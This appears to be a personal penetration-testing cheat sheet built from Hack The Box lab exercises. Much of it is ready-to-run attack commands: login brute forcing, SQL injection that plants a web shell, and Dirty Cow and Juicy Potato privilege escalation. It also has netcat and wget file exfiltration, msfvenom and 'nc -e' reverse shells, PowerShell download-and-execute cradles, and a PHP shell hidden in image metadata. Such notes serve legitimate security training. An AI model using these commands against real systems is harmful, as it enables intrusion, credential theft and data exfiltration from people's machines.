Attach hostnames to an ip
  - go to etc/hosts and edit 
    - you will need to run the following on hosts: sudo chmod 777 hosts 
  - add a line with the following format: <IP> (tab) <Hostname> <Hostname>
  	- Or: sudo echo "10.10.10.79 valentine.htb" | sudo tee -a /etc/hosts   
  
Enumerate a WordPress website
  - wpscan --url https://brainfuck.htb/ --disable-tls-checks
  	- Look for vulnerable or outdated plugins to exploit.
  - wpscan --url https://brainfuck.htb/ --disable-tls-checks --enumerate p --enumerate t --enumerate u
 
Shell Shock: 
	- When a pentesting a website over port 80 and you find a directory named cgi-bin, then you need to test for shell shock
		- checking for shell shock: nmap -sV -p 80 -Pn --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56

Nikto
	- nikto -host http://10.10.10.15
		- If webdav is enabled: davtest -url http://10.10.10.15 -move -cleanup
mount
	- if you see a mountd service, do the following 
		- check what shares are availble: showmount -e <address of machine>
		- create a directory to attach it to the share: mkdir /mnt/nfs
			- $ showmount -e remote.htb
					Export list for remote.htb:
					/site_backups (everyone)
		- Mount the share: mount -t nfs -o vers=3 <address of machine>:<share name or path> /mnt/nfs
			- $ mount -t nfs -o vers=3 remote.htb:/site_backups /mnt/nfs
Hydra: 
	- How to brute force a login page
		- sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
			- sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form '/department/login.php:username=admin&password=^PASS^:Invalid Password!'
		- To determine both the method and the request body: Inspect Element > Network
			- Method will be seen easily as http-post-form
			- right click and edit & resend then copy the request body. 
SearchSploit 
  - searchsploit <service name>
    - To grab specific text file: searchsploit -x file.txt
    
To crack an SSH key with John
  - python sshng2john.py id_rsa > ssh_login
  - john ssh_login --wordlist=/usr/share/wordlists/rockyou.txt
    - Then, ssh with the key and the obtained password: ssh -i id_rsa orestis@10.10.10.17
    
Generate an SSH key: ssh-keygen -f postman  

Enumerating SMB: https://infinitelogins.com/2020/06/17/enumerating-smb-for-pentesting/#:~:text=protocol%20negotiation%20failed%3A%20NT_STATUS_CONNECTION_DISCONNECTED%20This%20error%20occurs%20because,to%20use%20the%20weaker%20and%20more%20insecure%20protocols.
	- smbmap -H <IP Address>
	- sudo smbclient \\\\<ip-addr>\\<share>
		- NT_STATUS_CONNECTION_DISCONNECTED:
			- sudo nano /etc/samba/smb.conf
			- Under Global: client min protocol = LANMAN1

nmap
  - Initial Scan: nmap -sC -sV -O -oA initial 10.10.10.13
  - Run the below as you enumerate your initial findings
    - Scan all ports: nmap -sC -sV -O -p- -oA full 10.10.10.13
    - UDP Scan: nmap -sU -O -p- -oA udp 10.10.10.13
    - UDP 1000 ports scan: nmap -sU udep-1000 10.10.10.13 
    - Vuln Scan: nmap--script vuln 10.10.10.13
    - scan 445 for vul: nmap -Pn -p 445 --script smb-vuln-* 10.10.10.4 > 445.txt  
    	- https://github.com/1nf1n17yk1ng/MS17-010_CVE-2017-0143
    
nslookup
  - if port 53 (DNS) is open, ask the DNS server what domain name is associated with a certian IP by running the following
    - nslookup 
    - server <dns ip>
    - <ip in question>

Zone Transfer 
  - host -l <domain name> <DNS IP>
  - Other method: dig axfr @<DNS IP> <domain name>
  
Retreiving emails from an email server
	- nc -nv <IP> 110
	- USER <username>
	- PASS <Password>
	- retr 1
	- retr 2

Dirty Cow (Linux Prive Esc) 
	- Download on the attacker machine: https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
	- uploade it to the vicitm 
	- the vicitm needs to have gcc installed 
	- on the vicitm: 
		- gcc -pthread dirty.c -o dirty -lcrypt
		- chmod 777 dirty 
		- ./dirty <desired password>
	- use the password to ssh into the vicitm in a new window. 
	

rbash escape: ssh mindy@10.10.10.51 -t bash

Manual SQL Injection: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
	- To find out how many columns append order by <number of suspected columns>: http://10.10.10.143/room.php?cod=1 order by 7
	- To determine where the column result is being outputted on the page: http://10.10.10.143/room.php?cod=9999 union select 1,2,3,4,5,6,7
		- Sometimes only one output is allowed at a time, so make sure the first item is invalid
	- To get version http://10.10.10.143/room.php?cod=9999 union select 1,(select @@version),3,4,5,6,7
	- get username: http://10.10.10.143/room.php?cod=9999 union select 1,(select password FROM mysql.user),3,4,5,6,7
		- http://10.10.10.143/room.php?cod=9999 union select 1,(select group_concat(host,user,password) FROM mysql.user),3,4,5,6,7
		- http://10.10.10.143/room.php?cod=9999 union select 1,LOAD_FILE('/etc/passwd'),3,4,5,6,7
	- To upload a shell: http://10.10.10.143/room.php?cod=9999 union select 1,(select '<?php exec(\"wget -O /var/www/html/shell.php http://10.10.14.12:5555/php-reverse-shell.php\");?>'),3,4,5,6,7 INTO OUTFILE '/var/www/html/test4.php'
		- Start simple http server to serve your php shell
		- browse to http://10.10.10.143/test4.php
		- nc -lncvp 1234
		- browse to httP;//10.10.10.143/shell.php
		
Exploit systemctl on Linux: https://ranakhalil101.medium.com/hack-the-box-jarvis-writeup-w-o-metasploit-9f4cc7907c87	
		
		
		
		
masscan: sudo masscan -e tun0 -p1-65535 --rate=1000 10.10.10.43

gobuster

  Update: sudo apt update && apt upgrade -y
  Install gobuster: sudo apt-get install gobuster 
  Run it: gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster/80results.txt 
    To run with https: add -k at the end to ignore certificate and adjust http to https. 
  Run it and look for specific extensions: gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/Dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.sh

Upgrade Shell
https://github.com/SammyBasri/HackTheBox/blob/main/notes.txt
  - python -c 'import pty;pty.spawn("/bin/bash")'

To find files/folders owned by a user
  - find / -user user 2> /dev/null
  
To switch to a different user while in a Linux shell: su - <username>  or su <usrename>

Using Netcat to exfil files 
  - On attacker machine: nc -lnvp 80 > ExfilFile
  - On victim machine: nc <attackers IP> 80 < ExfilFile
  
Getting hashes out of a ntds.dit and ntds.bin
	- bin is the SYSTEM file 
  - impacket-secretsdump -ntds ntds.dit -system <bin file> LOCAL

Proxy: Connecting to a VNC service over an SSH connection.
	 - ssh: ssh -L 5901:127.0.0.1:5901 -N -f -l charix 10.10.10.84
	 	- vncviewer localhost:5901 -passwd secret

Enum Notes:

  - Tomcat services usually have a login page at 10.10.10.55/manager/html
  - To check what other devices the victim is communicating with: arp -a 
    - Then check a few ports on the machines found: nc -v <machine address> <port>
  - FTP Anonymous loging: ftp <address>
  	- anonymous/<blank>
  - To create shell as another user: sudo -u <username> /bin/bash
  - List all process: ps aux
  - Simple Prive Esc: sudo -l 
  - To list setuid binaries: find / -perm -4000 2>/dev/null
  - internal.conf can potentially be found at /etc/apache2/sites-enabled
  - List files and folder owned by a user: find / -user jimmy 2>/dev/null

John: 
	- john --worldlist=rockyou.txt <hash file>
		- john --show <hash file>
Hashcat: 
	- hashcat -m 18200 --force -a 0 hashes.asreproast /usr/share/wordlists/rockyou.tx
Exiftool: How to hide php shell within an image
	- sudo apt update && apt upgrade -y 
	- sudo apt install exiftool -y
	- exiftool -Comment="$(< rev.php)" <image file that will be uploaded>
Wget Exfil:
	- On your machine: nc -lnvp 80
	- On victim: wget --post-file=/root/root.txt <attacker IP>

Dumping a local Mysql DB: You need credentials
	- check if active: systemctl status mysql
	- dump: mysqldump --opt -u theseus --password=iamkingtheseus  --all-databases> pp.sql

  
Use scp to download files via ssh
     - sudo scp root@192.168.100.22:/etc/file .
     
Password Protected SSH Private Key: 
	- python ssh2john.py key > out.txt 
	- sudo john --wordlist=rockyou.txt out.txt
  
 
 Windows: 
 	- tasklist: lists all running tasks.  
 
	- Port 445: sudo nmap -Pn -p 445 --script smb-vuln-* legacy.htb
	- msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=1234 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
		- msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f aspx > shell.aspx
		- when uploading this shell to an ftp server that is connected to an IIS, FTP to the server, run "bin" and upload the shell. 
	- After establishing RCE on a machine, follow these steps to get a shell: 
		- On attacker machine: 
			- Locate and copy nc.exe to a dir of your choice
				- locate nc.exe 
				- cp <nc.exe path> .
			- python -m SimpleHTTPServer 80
			- nc -lnvp 1234
		- On victim machine
			- mkdir C:\temp
			- certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe
			- C:\temp\nc.exe -e cmd.exe 10.10.XX.XX 1234
			
	- impacket
		- Start SMB server: impacket-smbserver smb Downloads/ 
		- On victim: copy \\10.10.16.12\smb\nc.exe
		
	- Bypassing shell uplaod filtering on IIS
		- Upload web.config to victim: https://raw.githubusercontent.com/tennc/webshell/master/aspx/web.config
		- On the attacker machine, locate nc.exe and serve via SMB: impacket-smbserver smb Downloads/ 
			- Listen for a connection: nc -lnvp 1234
		- http://bounty.htb/uploadedfiles/web.config?cmd=\\10.10.XX.XX\smb\nc.exe -e cmd.exe 10.10.XX.XX 1337
		
	- Privelege escalation 
		- Juicy Potato
			- SeImpersonatePrivilege and seAssignPrimaryTokenPrivilege needs to be enabled: whoami /priv
			- Download the exe: https://github.com/ohpe/juicy-potato/releases/tag/v0.1
			- On the attacker machine listen on a port of you choosing: nc -lnvp 1337
			- on the vicitm machine: 
				- go to the parent dir
				
			- On the victim machine: juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\tmp\nc.exe -e cmd.exe 10.10.XX.XX 1337" -t *
		- Find some credentials in the registry for autologon:
			- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

		- Juicy potato alternative method: 
			- SeImpersonatePrivilege and seAssignPrimaryTokenPrivilege needs to be enabled: whoami /priv
			- systeminfo shows system is 32bits
			- Download juicypotato x86: https://github.com/ivanitlearning/Juicy-Potato-x86/releases
			- Create a reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe > shell.exe
			- uploade both files to victim: 
			  - On attacker: 
			  	- impacket-smbserver smb Downloads/
				- nc -lnvp 1337
			  - On Victim:
			  	- mkdir C:\temp
				- cd C:\temp
				- copy \\10.10.16.12\smb\shell.exe
				- copy \\10.10.16.12\smb\juicypotato86.exe
				- juicypotato86.exe -l 1337 -p shell.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
	
	- LDAP
		- ldapsearch: ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local"
	- enum4linux: 
		- enum4linux forest.htb > enum4linux.txt
		- cat enum4linux.txt | grep -i users
		- After getting usernames, if kerberos is running on port 88, then you might be able to get password hashes by running this
			- python3 GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
			
			
	- SirepRAT:
		- Download: git clond https://github.com/SafeBreach-Labs/SirepRAT
		- cd SirepRAT
		- install requeriments as explained in the github page.
		- "Donwload nc64.exe into this dierctory"
		- start python SimpleHTTPServer
		- Upload nc64.exe: python2 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -outfile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -uri 10.10.14.169/nc64.exe" --v
		- Start listening to a port for example 1234
			- python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\> python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe"" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.16.7 1234 -e powershell.exe" --v
			
	- Sherlock.ps1:
		- Once you get it on the attacker machine, start an http server on the attacker machine and run this command on the victim: powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.9/Sherlock.ps1'); Find-AllVulns
	- Example of chaining commands on windows: C:\temp> C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 


			

		
		
			
		
			
			




  
    

  
    
    

  

